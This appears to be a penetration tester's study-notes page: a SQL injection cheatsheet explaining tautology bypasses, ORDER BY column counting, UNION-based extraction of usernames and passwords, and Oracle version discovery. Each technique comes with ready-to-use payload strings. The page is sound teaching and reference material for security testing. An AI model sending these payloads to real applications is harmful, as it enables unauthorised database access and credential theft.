---
layout: page
title: SQL Injection Cheatsheet
parent: SQL Injection
grand_parent: Attacks
---
# {{ page.title }}
{: .no_toc }

<details open markdown="block">
  <summary>
    Table of contents
  </summary>
  {: .text-delta }
- TOC
{:toc}
</details>

---
## Basic SQL Statement 
A large amount of SQL statements on something like a product search page will be structured similarly too:
{% highlight sql %}
SELECT * FROM {some-table(s)} WHERE {some-field} = '{some-query}'

SELECT * FROM products WHERE categories = 'Gifts' AND released = 1
{% endhighlight %}

## Handling Different SQL System Syntax
There is a variety of SQL platforms available now and each use slightly different SQL syntax to carry out operations. A useful cheatsheet can be found on the [PortSwigger SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet) here that details the different syntax for each main platform. There is also a fairly comprehensive cheat sheet [here](https://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet) for different systems.

## Basic Evaluate True (Return All)
A very basic way to exploit a statement like the above would be to break out of the quotes and then add a statement that always evaluates as true and comment out the final section of the statement.

Adding a simple `' OR 1=1--`, escapes the categories field value by ending the quotes, adds an `OR` statement followed by a statement that always evaluates as True. Finally we use a `--` to comment out any other statements following in the query.

{% highlight sql %}
SELECT * FROM products WHERE categories = '' OR 1=1-- ' AND released = 1
{% endhighlight %}

## Determining the number of columns in a table
Finding out the number of columns in a table can be very useful for construction a [UNION attack](https://portswigger.net/web-security/sql-injection/union-attacks) as to `UNION` another table to the result you need to match the number of columns. This means before we can create this attack we need to determine how many columns are in the current table.

To do this we can use the `ORDER BY` command to determine how many columns are in the table. By escaping a parameter and then adding an `ORDER BY 1--` you can control the order of the results by sorting based on the column index specified.

This means that you can increase the number until you get a server error (indicating that you have tried to select a column index out of range) allowing you to determine the number of columns in a table.

{% highlight sql %}
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
etc
{% endhighlight %}

## UNION Attacks
`UNION` Attacks are where you use a `UNION` command to attach a secondary/multiple more statements to the end of an SQL command to retrieve information from another table or different columns.

Some key requirements for a UNION attack is that the number of columns that are being appended to the bottom of the original result have to match. You can determine the number of columns of a table using a method described in [Determining the number of columns in a table](https://alipali737.github.io/pen-test-docs/Attacks/sql-injection/SQL%20Injection%20Cheatsheet.html#determining-the-number-of-columns-in-a-table)

More information can also be found on the [PortSwigger UNION Attacks](https://portswigger.net/web-security/sql-injection/union-attacks) page.

#### Append a blank table to the end of the list with NULL values
{% highlight sql %}
' UNION SELECT NULL,NULL,NULL--
{% endhighlight %}

#### Finding columns that have a useful data type
{% highlight sql %}
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
{% endhighlight %}

#### Retrieving information from another table
- For this you must make sure that you follow the appropriate number of columns needed for the UNION to work
- This also requires you to know the column names and table name for the data you wish to access
{% highlight sql %}
' UNION SELECT username, password FROM users--
{% endhighlight %}

#### Retrieving multiple values within a single column
- If you wish to return data that is more columns that the original query you can concatinate the data from the extracted table into a single column
- This could also be required if you only have limited columns that support the data type you require
{% highlight sql %}
' UNION SELECT username || '-' || password FROM users--
' UNION SELECT NULL,username || '-' || password FROM users--
{% endhighlight %}

## Discovering System Information
- There is often varibles and tables that come as default for many SQL implementations that details the versions and technologies used
- These are specific to the languag but can be very helpful for recon on the target

{% highlight sql %}
-- Oracle:
SELECT banner FROM v$version
SELECT banner FROM v$version WHERE banner LIKE ‘Oracle%’
SELECT banner FROM v$version WHERE banner LIKE ‘TNS%’
SELECT version FROM v$instance
{% endhighlight %}